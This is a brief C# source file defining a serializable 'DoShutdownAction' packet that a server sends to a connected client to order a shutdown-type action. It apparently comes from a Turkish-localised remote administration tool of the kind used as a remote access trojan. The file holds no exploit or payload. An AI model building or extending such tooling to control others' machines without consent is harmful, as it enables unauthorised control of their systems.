using System;
using xServer.KuuhakuCekirdek.Ağ;
using xServer.Enumlar2;

namespace xServer.KuuhakuCekirdek.Paketler.ServerPaketleri
{
    [Serializable]
    public class DoShutdownAction : IPacket
    {
        public KapatmaEylemleri Action { get; set; }

        public DoShutdownAction()
        {
        }

        public DoShutdownAction(KapatmaEylemleri action)
        {
            this.Action = action;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}